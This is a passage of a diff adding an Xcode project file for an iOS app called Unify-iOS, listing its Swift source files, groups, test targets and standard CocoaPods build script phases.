+		7C33D3DCEC65CE500E8F21EE /* Pods-Unify-iOS.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Unify-iOS.release.xcconfig"; path = "Target Support Files/Pods-Unify-iOS/Pods-Unify-iOS.release.xcconfig"; sourceTree = "<group>"; };
+		8A1993EA375901CFA01B32B7 /* Pods-Unify-iOS-Unify-iOSUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Unify-iOS-Unify-iOSUITests.debug.xcconfig"; path = "Target Support Files/Pods-Unify-iOS-Unify-iOSUITests/Pods-Unify-iOS-Unify-iOSUITests.debug.xcconfig"; sourceTree = "<group>"; };
+		8F0BA7A0CB233FF4D8075F34 /* Pods_Unify_iOSTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Unify_iOSTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		9230842DCB67DC7D2240A446 /* Pods-Unify-iOSTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Unify-iOSTests.debug.xcconfig"; path = "Target Support Files/Pods-Unify-iOSTests/Pods-Unify-iOSTests.debug.xcconfig"; sourceTree = "<group>"; };
+		98513EEC6796D9A53229D2A1 /* Pods-Unify-iOS-Unify-iOSUITests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Unify-iOS-Unify-iOSUITests.release.xcconfig"; path = "Target Support Files/Pods-Unify-iOS-Unify-iOSUITests/Pods-Unify-iOS-Unify-iOSUITests.release.xcconfig"; sourceTree = "<group>"; };
+		A7640ECCE5B6C424C9F5ED88 /* Pods_Unify_iOS_Unify_iOSUITests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Unify_iOS_Unify_iOSUITests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		C7D5BAA3C1D23E5C50BF9924 /* Pods-Unify-iOSTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Unify-iOSTests.release.xcconfig"; path = "Target Support Files/Pods-Unify-iOSTests/Pods-Unify-iOSTests.release.xcconfig"; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		12CC7561253D9BBA00FE9B56 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				F58A7FD14625862E165EB2D4 /* Pods_Unify_iOS.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		12CC757A253D9BBD00FE9B56 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				74035908F8F1D769B2559E0B /* Pods_Unify_iOSTests.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		12CC7585253D9BBD00FE9B56 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				08EF87B8D414850D6C399BD0 /* Pods_Unify_iOS_Unify_iOSUITests.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		0FDF8C197133BBBFDA11B13A /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				16DB7CC0BE87283A73F6FD39 /* Pods-Unify-iOS.debug.xcconfig */,
+				7C33D3DCEC65CE500E8F21EE /* Pods-Unify-iOS.release.xcconfig */,
+				8A1993EA375901CFA01B32B7 /* Pods-Unify-iOS-Unify-iOSUITests.debug.xcconfig */,
+				98513EEC6796D9A53229D2A1 /* Pods-Unify-iOS-Unify-iOSUITests.release.xcconfig */,
+				9230842DCB67DC7D2240A446 /* Pods-Unify-iOSTests.debug.xcconfig */,
+				C7D5BAA3C1D23E5C50BF9924 /* Pods-Unify-iOSTests.release.xcconfig */,
+			);
+			path = Pods;
+			sourceTree = "<group>";
+		};
+		124504F425B1EC7C0071E925 /* Profile */ = {
+			isa = PBXGroup;
+			children = (
+				124504EF25B1E7470071E925 /* ProfileViewController.swift */,
+				1211D20D25F374C60081CC21 /* ProfileViewModel.swift */,
+			);
+			path = Profile;
+			sourceTree = "<group>";
+		};
+		12582CDB25470452004E12D6 /* Home */ = {
+			isa = PBXGroup;
+			children = (
+				12582CDC25470468004E12D6 /* HomeViewController.swift */,
+				128CCEFC2567C6080080A629 /* HomeViewModel.swift */,
+				128CCF272567E8480080A629 /* View */,
+			);
+			path = Home;
+			sourceTree = "<group>";
+		};
+		12582D062549D477004E12D6 /* Models */ = {
+			isa = PBXGroup;
+			children = (
+				1258EFCD2646BBC900C09271 /* Message */,
+				12582D342549DADB004E12D6 /* User */,
+				12582D232549D88C004E12D6 /* University */,
+				12582D332549DAC3004E12D6 /* Study Year */,
+				12582D322549DAB7004E12D6 /* Property */,
+				12582D312549DAA9004E12D6 /* Course */,
+			);
+			path = Models;
+			sourceTree = "<group>";
+		};
+		12582D232549D88C004E12D6 /* University */ = {
+			isa = PBXGroup;
+			children = (
+				12582D0F2549D56B004E12D6 /* University.swift */,
+				126A0AE6261AF619001A6586 /* UniversityData.swift */,
+			);
+			path = University;
+			sourceTree = "<group>";
+		};
+		12582D312549DAA9004E12D6 /* Course */ = {
+			isa = PBXGroup;
+			children = (
+				12582D142549D573004E12D6 /* Course.swift */,
+				12582D2C2549DA9B004E12D6 /* CourseData.swift */,
+			);
+			path = Course;
+			sourceTree = "<group>";
+		};
+		12582D322549DAB7004E12D6 /* Property */ = {
+			isa = PBXGroup;
+			children = (
+				12582D1E2549D5FC004E12D6 /* Property.swift */,
+			);
+			path = Property;
+			sourceTree = "<group>";
+		};
+		12582D332549DAC3004E12D6 /* Study Year */ = {
+			isa = PBXGroup;
+			children = (
+				12582D192549D580004E12D6 /* StudyYear.swift */,
+				120D2CC125570B8200C8E143 /* StudyYearData.swift */,
+			);
+			path = "Study Year";
+			sourceTree = "<group>";
+		};
+		12582D342549DADB004E12D6 /* User */ = {
+			isa = PBXGroup;
+			children = (
+				12582D072549D482004E12D6 /* User.swift */,
+				12A8BF352647078E00A53597 /* UserDummyData */,
+			);
+			path = User;
+			sourceTree = "<group>";
+		};
+		1258EFCD2646BBC900C09271 /* Message */ = {
+			isa = PBXGroup;
+			children = (
+				1258EFCE2646BCEA00C09271 /* Messages.swift */,
+			);
+			name = Message;
+			sourceTree = "<group>";
+		};
+		125A103925974B4C00FFFDA6 /* AccountManager */ = {
+			isa = PBXGroup;
+			children = (
+				125A103425974B4800FFFDA6 /* AccountManager.swift */,
+				125A1045259757EE00FFFDA6 /* UnifyStore.swift */,
+			);
+			path = AccountManager;
+			sourceTree = "<group>";
+		};
+		125DE3CB264DAE69007AAED8 /* Extensions */ = {
+			isa = PBXGroup;
+			children = (
+				125DE3D4264DAEBE007AAED8 /* UIView+Extensions.swift */,
+				125DE3E1264DAF08007AAED8 /* UserDefaults+Extensions.swift */,
+				125DE3DC264DAEDC007AAED8 /* Floaty+Extensions.swift */,
+				125DE3CF264DAE86007AAED8 /* UIViewController+Extensions.swift */,
+				125DE3F7264DCA2A007AAED8 /* String+Extensions.swift */,
+			);
+			path = Extensions;
+			sourceTree = "<group>";
+		};
+		126A0AE2261AF5A2001A6586 /* UniversityProfile */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			name = UniversityProfile;
+			sourceTree = "<group>";
+		};
+		127EA3972624EC54003130DC /* Forgotten Passwrd */ = {
+			isa = PBXGroup;
+			children = (
+				127EA3982624EC90003130DC /* ForgottenPasswordViewController.swift */,
+			);
+			name = "Forgotten Passwrd";
+			sourceTree = "<group>";
+		};
+		128BEFF72551637E0010F731 /* Create Profile */ = {
+			isa = PBXGroup;
+			children = (
+				128BEFF2255163660010F731 /* CreateProfileViewController.swift */,
+				128BF062255326880010F731 /* CreateProfileViewModel.swift */,
+			);
+			path = "Create Profile";
+			sourceTree = "<group>";
+		};
+		128CCF272567E8480080A629 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				128CCF222567E8380080A629 /* HomePageTableViewCell.swift */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		128DA0D425E9924700CF8308 /* Custom Views */ = {
+			isa = PBXGroup;
+			children = (
+				128DA0E525E9932C00CF8308 /* UnifyTitleLabel.swift */,
+				124C21F925EE7834005E6A7F /* AvatarView.swift */,
+				124C21EA25EE5FDE005E6A7F /* UnifyTextField.swift */,
+				124C21FE25EE9509005E6A7F /* UnifySearchTextField.swift */,
+				124C21A525ED3CF5005E6A7F /* UnifyButton.swift */,
+				122FE77325AA4B60000E1016 /* LoadingIncator.swift */,
+			);
+			path = "Custom Views";
+			sourceTree = "<group>";
+		};
+		12A8BF222646D33200A53597 /* ChatLog */ = {
+			isa = PBXGroup;
+			children = (
+				12A8BF2D2646E01500A53597 /* ChatLogViewController.swift */,
+				12A8BF1D2646D32A00A53597 /* ChatLogViewModel.swift */,
+				12D578D825BB3B2100EDD5D6 /* ChatLogCollectionViewCell.swift */,
+			);
+			path = ChatLog;
+			sourceTree = "<group>";
+		};
+		12A8BF352647078E00A53597 /* UserDummyData */ = {
+			isa = PBXGroup;
+			children = (
+				124504EA25B1D6910071E925 /* UserData.swift */,
+				12A8BF39264707A300A53597 /* UserModelDummy.swift */,
+			);
+			path = UserDummyData;
+			sourceTree = "<group>";
+		};
+		12A8BF4426470ED000A53597 /* Screens */ = {
+			isa = PBXGroup;
+			children = (
+				12582CDB25470452004E12D6 /* Home */,
+				12D7DEE825F186BA00366B3D /* UniversitySelect */,
+				124504F425B1EC7C0071E925 /* Profile */,
+				12D578CF25BB351A00EDD5D6 /* Messages */,
+			);
+			path = Screens;
+			sourceTree = "<group>";
+		};
+		12AE6CC0253ED90A00942888 /* Managers */ = {
+			isa = PBXGroup;
+			children = (
+				12AE6CC1253ED92300942888 /* NetworkManager.swift */,
+				1216B7C9264FB74100C19ACA /* CommunicationManager.swift */,
+				12D7DEF025F2D07C00366B3D /* PersistenceManager.swift */,
+			);
+			path = Managers;
+			sourceTree = "<group>";
+		};
+		12CC755B253D9BBA00FE9B56 = {
+			isa = PBXGroup;
+			children = (
+				12BC6A30264034F300E5474A /* TestViewController.swift */,
+				12CC7566253D9BBA00FE9B56 /* Unify-iOS */,
+				12CC7580253D9BBD00FE9B56 /* Unify-iOSTests */,
+				12CC758B253D9BBD00FE9B56 /* Unify-iOSUITests */,
+				12CC7565253D9BBA00FE9B56 /* Products */,
+				0FDF8C197133BBBFDA11B13A /* Pods */,
+				4F2A435A6D350EE46546968A /* Frameworks */,
+			);
+			sourceTree = "<group>";
+		};
+		12CC7565253D9BBA00FE9B56 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				12CC7564253D9BBA00FE9B56 /* Unify-iOS.app */,
+				12CC757D253D9BBD00FE9B56 /* Unify-iOSTests.xctest */,
+				12CC7588253D9BBD00FE9B56 /* Unify-iOSUITests.xctest */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		12CC7566253D9BBA00FE9B56 /* Unify-iOS */ = {
+			isa = PBXGroup;
+			children = (
+				125DE375264C74D6007AAED8 /* Unify-iOS.entitlements */,
+				12CC7567253D9BBA00FE9B56 /* AppDelegate.swift */,
+				12CC7569253D9BBA00FE9B56 /* SceneDelegate.swift */,
+				125129C4264C5E42003F678F /* RootViewController.swift */,
+				125DE31E264C6302007AAED8 /* UnifyNavigationController.swift */,
+				12582D062549D477004E12D6 /* Models */,
+				12CC75A6253D9D9600FE9B56 /* Onboarding */,
+				12A8BF4426470ED000A53597 /* Screens */,
+				125A103925974B4C00FFFDA6 /* AccountManager */,
+				12AE6CC0253ED90A00942888 /* Managers */,
+				128DA0D425E9924700CF8308 /* Custom Views */,
+				12CC75B9253DA57400FE9B56 /* Utilities */,
+				12CC7573253D9BBD00FE9B56 /* Assets.xcassets */,
+				12CC7578253D9BBD00FE9B56 /* Info.plist */,
+				12AE6C9D253ED69900942888 /* GoogleService-Info.plist */,
+				12CC7570253D9BBA00FE9B56 /* Unify_iOS.xcdatamodeld */,
+			);
+			path = "Unify-iOS";
+			sourceTree = "<group>";
+		};
+		12CC7580253D9BBD00FE9B56 /* Unify-iOSTests */ = {
+			isa = PBXGroup;
+			children = (
+				12CC7581253D9BBD00FE9B56 /* EmailValidationTest.swift */,
+				12BC6A5326435D7300E5474A /* PasswordValidationTest.swift */,
+				12BC6A5E2643610B00E5474A /* UsernameValidationTest.swift */,
+				12CC7583253D9BBD00FE9B56 /* Info.plist */,
+			);
+			path = "Unify-iOSTests";
+			sourceTree = "<group>";
+		};
+		12CC758B253D9BBD00FE9B56 /* Unify-iOSUITests */ = {
+			isa = PBXGroup;
+			children = (
+				12CC758C253D9BBD00FE9B56 /* Unify_iOSUITests.swift */,
+				12CC758E253D9BBD00FE9B56 /* Info.plist */,
+			);
+			path = "Unify-iOSUITests";
+			sourceTree = "<group>";
+		};
+		12CC75A6253D9D9600FE9B56 /* Onboarding */ = {
+			isa = PBXGroup;
+			children = (
+				12CC75B0253D9DCE00FE9B56 /* Login Options */,
+				12CC75D4253DB25C00FE9B56 /* Login  */,
+				12CC75A7253D9D9C00FE9B56 /* Sign up */,
+			);
+			path = Onboarding;
+			sourceTree = "<group>";
+		};
+		12CC75A7253D9D9C00FE9B56 /* Sign up */ = {
+			isa = PBXGroup;
+			children = (
+				12CC756B253D9BBA00FE9B56 /* SignUpViewController.swift */,
+				128BF067255326910010F731 /* SignUpViewModel.swift */,
+				128BEFF72551637E0010F731 /* Create Profile */,
+			);
+			path = "Sign up";
+			sourceTree = "<group>";
+		};
+		12CC75B0253D9DCE00FE9B56 /* Login Options */ = {
+			isa = PBXGroup;
+			children = (
+				12CC75A8253D9DC900FE9B56 /* UserLoginOptionsViewController.swift */,
+				12CC75D8253DB29B00FE9B56 /* UserLoginViewModel.swift */,
+			);
+			path = "Login Options";
+			sourceTree = "<group>";
+		};
+		12CC75B9253DA57400FE9B56 /* Utilities */ = {
+			isa = PBXGroup;
+			children = (
+				12CC75C4253DA7DC00FE9B56 /* Unify.swift */,
+				125DE3CB264DAE69007AAED8 /* Extensions */,
+				1258EE722646137300C09271 /* ObjectSavable.swift */,
+				126A0B1D2620CB42001A6586 /* SFSymbols.swift */,
+				12CC75BF253DA62600FE9B56 /* Strings.swift */,
+				12CC75BA253DA58500FE9B56 /* UnifyColors.swift */,
+				128DA0DB25E9929900CF8308 /* UnifyErrors.swift */,
+				125DE449264DFAB3007AAED8 /* UnifyAlertView.swift */,
+			);
+			path = Utilities;
+			sourceTree = "<group>";
+		};
+		12CC75D4253DB25C00FE9B56 /* Login  */ = {
+			isa = PBXGroup;
+			children = (
+				12CC75CF253DB24200FE9B56 /* LoginViewController.swift */,
+				126A09E92619C559001A6586 /* PhoneLoginViewController.swift */,
+				127EA3972624EC54003130DC /* Forgotten Passwrd */,
+				128BF06C2553269A0010F731 /* LoginViewModel.swift */,
+			);
+			path = "Login ";
+			sourceTree = "<group>";
+		};
+		12D578CF25BB351A00EDD5D6 /* Messages */ = {
+			isa = PBXGroup;
+			children = (
+				12A8BF222646D33200A53597 /* ChatLog */,
+				1211D20325F373E10081CC21 /* MessagesViewController.swift */,
+				1258EFC82646B3A700C09271 /* MessagesTableViewCell.swift */,
+				1211D20825F373F40081CC21 /* MessagesViewModel.swift */,
+			);
+			path = Messages;
+			sourceTree = "<group>";
+		};
+		12D7DEE825F186BA00366B3D /* UniversitySelect */ = {
+			isa = PBXGroup;
+			children = (
+				12D7DED525F154AD00366B3D /* UniversitySelectViewController.swift */,
+				12D7DEE325F185B300366B3D /* UniversitySelectViewModel.swift */,
+				126A0AE2261AF5A2001A6586 /* UniversityProfile */,
+				12D7DEDE25F157D600366B3D /* UniversityCollectionViewCell.swift */,
+			);
+			path = UniversitySelect;
+			sourceTree = "<group>";
+		};
+		4F2A435A6D350EE46546968A /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				38E0B9EBB637E5A4AE8AEA22 /* Pods_Unify_iOS.framework */,
+				A7640ECCE5B6C424C9F5ED88 /* Pods_Unify_iOS_Unify_iOSUITests.framework */,
+				8F0BA7A0CB233FF4D8075F34 /* Pods_Unify_iOSTests.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		12CC7563253D9BBA00FE9B56 /* Unify-iOS */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 12CC7591253D9BBD00FE9B56 /* Build configuration list for PBXNativeTarget "Unify-iOS" */;
+			buildPhases = (
+				B4E102116EBA18C6D97942BA /* [CP] Check Pods Manifest.lock */,
+				12CC7560253D9BBA00FE9B56 /* Sources */,
+				12CC7561253D9BBA00FE9B56 /* Frameworks */,
+				12CC7562253D9BBA00FE9B56 /* Resources */,
+				2C28688C2049FDA12DC6AE1A /* [CP] Embed Pods Frameworks */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = "Unify-iOS";
+			productName = "Unify-iOS";
+			productReference = 12CC7564253D9BBA00FE9B56 /* Unify-iOS.app */;
+			productType = "com.apple.product-type.application";
+		};
+		12CC757C253D9BBD00FE9B56 /* Unify-iOSTests */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 12CC7594253D9BBD00FE9B56 /* Build configuration list for PBXNativeTarget "Unify-iOSTests" */;
+			buildPhases = (
+				7D8128815974683E66AF23F7 /* [CP] Check Pods Manifest.lock */,
+				12CC7579253D9BBD00FE9B56 /* Sources */,
+				12CC757A253D9BBD00FE9B56 /* Frameworks */,
+				12CC757B253D9BBD00FE9B56 /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				12CC757F253D9BBD00FE9B56 /* PBXTargetDependency */,
+			);
+			name = "Unify-iOSTests";
+			productName = "Unify-iOSTests";
+			productReference = 12CC757D253D9BBD00FE9B56 /* Unify-iOSTests.xctest */;
+			productType = "com.apple.product-type.bundle.unit-test";
+		};
+		12CC7587253D9BBD00FE9B56 /* Unify-iOSUITests */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 12CC7597253D9BBD00FE9B56 /* Build configuration list for PBXNativeTarget "Unify-iOSUITests" */;
+			buildPhases = (
+				24A433731982E8522A35CB56 /* [CP] Check Pods Manifest.lock */,
+				12CC7584253D9BBD00FE9B56 /* Sources */,
+				12CC7585253D9BBD00FE9B56 /* Frameworks */,
+				12CC7586253D9BBD00FE9B56 /* Resources */,
+				DA02443C50500E55897EF466 /* [CP] Embed Pods Frameworks */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				12CC758A253D9BBD00FE9B56 /* PBXTargetDependency */,
+			);
+			name = "Unify-iOSUITests";
+			productName = "Unify-iOSUITests";
+			productReference = 12CC7588253D9BBD00FE9B56 /* Unify-iOSUITests.xctest */;
+			productType = "com.apple.product-type.bundle.ui-testing";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		12CC755C253D9BBA00FE9B56 /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				LastSwiftUpdateCheck = 1200;
+				LastUpgradeCheck = 1200;
+				TargetAttributes = {
+					12CC7563253D9BBA00FE9B56 = {
+						CreatedOnToolsVersion = 12.0.1;
+					};
+					12CC757C253D9BBD00FE9B56 = {
+						CreatedOnToolsVersion = 12.0.1;
+						TestTargetID = 12CC7563253D9BBA00FE9B56;
+					};
+					12CC7587253D9BBD00FE9B56 = {
+						CreatedOnToolsVersion = 12.0.1;
+						TestTargetID = 12CC7563253D9BBA00FE9B56;
+					};
+				};
+			};
+			buildConfigurationList = 12CC755F253D9BBA00FE9B56 /* Build configuration list for PBXProject "Unify-iOS" */;
+			compatibilityVersion = "Xcode 9.3";
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+			);
+			mainGroup = 12CC755B253D9BBA00FE9B56;
+			productRefGroup = 12CC7565253D9BBA00FE9B56 /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				12CC7563253D9BBA00FE9B56 /* Unify-iOS */,
+				12CC757C253D9BBD00FE9B56 /* Unify-iOSTests */,
+				12CC7587253D9BBD00FE9B56 /* Unify-iOSUITests */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXResourcesBuildPhase section */
+		12CC7562253D9BBA00FE9B56 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				12CC7574253D9BBD00FE9B56 /* Assets.xcassets in Resources */,
+				12AE6C9E253ED69A00942888 /* GoogleService-Info.plist in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		12CC757B253D9BBD00FE9B56 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		12CC7586253D9BBD00FE9B56 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		24A433731982E8522A35CB56 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-Unify-iOS-Unify-iOSUITests-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		2C28688C2049FDA12DC6AE1A /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Unify-iOS/Pods-Unify-iOS-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Unify-iOS/Pods-Unify-iOS-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Unify-iOS/Pods-Unify-iOS-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		7D8128815974683E66AF23F7 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-Unify-iOSTests-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		B4E102116EBA18C6D97942BA /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-Unify-iOS-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		DA02443C50500E55897EF466 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Unify-iOS-Unify-iOSUITests/Pods-Unify-iOS-Unify-iOSUITests-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Unify-iOS-Unify-iOSUITests/Pods-Unify-iOS-Unify-iOSUITests-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Unify-iOS-Unify-iOSUITests/Pods-Unify-iOS-Unify-iOSUITests-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		12CC7560253D9BBA00FE9B56 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				128BF06D2553269A0010F731 /* LoginViewModel.swift in Sources */,
+				12582D082549D482004E12D6 /* User.swift in Sources */,
+				12CC75D0253DB24200FE9B56 /* LoginViewController.swift in Sources */,
+				12CC756C253D9BBA00FE9B56 /* SignUpViewController.swift in Sources */,
+				12582D1F2549D5FC004E12D6 /* Property.swift in Sources */,
+				12A8BF3A264707A300A53597 /* UserModelDummy.swift in Sources */,
+				1216B7CA264FB74100C19ACA /* CommunicationManager.swift in Sources */,
+				12CC75C5253DA7DC00FE9B56 /* Unify.swift in Sources */,
+				128BF063255326880010F731 /* CreateProfileViewModel.swift in Sources */,
+				12582D1A2549D580004E12D6 /* StudyYear.swift in Sources */,
+				12CC75BB253DA58500FE9B56 /* UnifyColors.swift in Sources */,
+				128CCF232567E8380080A629 /* HomePageTableViewCell.swift in Sources */,
+				12D7DEDF25F157D600366B3D /* UniversityCollectionViewCell.swift in Sources */,
+				126A0AE7261AF619001A6586 /* UniversityData.swift in Sources */,
+				125A1046259757EE00FFFDA6 /* UnifyStore.swift in Sources */,
+				125DE31F264C6302007AAED8 /* UnifyNavigationController.swift in Sources */,
+				124C21FF25EE9509005E6A7F /* UnifySearchTextField.swift in Sources */,
+				122FE77425AA4B60000E1016 /* LoadingIncator.swift in Sources */,
+				124504F025B1E7470071E925 /* ProfileViewController.swift in Sources */,
+				124C21EB25EE5FDE005E6A7F /* UnifyTextField.swift in Sources */,
+				12582D2D2549DA9B004E12D6 /* CourseData.swift in Sources */,
+				125DE3DD264DAEDC007AAED8 /* Floaty+Extensions.swift in Sources */,
+				124C21AA25ED3EFA005E6A7F /* UnifyButton.swift in Sources */,
+				12BC6A31264034F300E5474A /* TestViewController.swift in Sources */,
+				128BEFF3255163660010F731 /* CreateProfileViewController.swift in Sources */,
+				12AE6CC2253ED92300942888 /* NetworkManager.swift in Sources */,
+				12CC7568253D9BBA00FE9B56 /* AppDelegate.swift in Sources */,
+				1258EE732646137300C09271 /* ObjectSavable.swift in Sources */,
+				126A0B1E2620CB42001A6586 /* SFSymbols.swift in Sources */,
+				125DE3F8264DCA2A007AAED8 /* String+Extensions.swift in Sources */,
+				1211D20E25F374C60081CC21 /* ProfileViewModel.swift in Sources */,
+				125DE3D0264DAE86007AAED8 /* UIViewController+Extensions.swift in Sources */,
+				127EA3992624EC90003130DC /* ForgottenPasswordViewController.swift in Sources */,
+				12582D102549D56B004E12D6 /* University.swift in Sources */,
+				128CCEFD2567C6080080A629 /* HomeViewModel.swift in Sources */,
+				12D7DEE425F185B300366B3D /* UniversitySelectViewModel.swift in Sources */,
+				12D578D925BB3B2100EDD5D6 /* ChatLogCollectionViewCell.swift in Sources */,
+				124504EB25B1D6910071E925 /* UserData.swift in Sources */,
+				126A09EA2619C559001A6586 /* PhoneLoginViewController.swift in Sources */,
+				12CC756A253D9BBA00FE9B56 /* SceneDelegate.swift in Sources */,
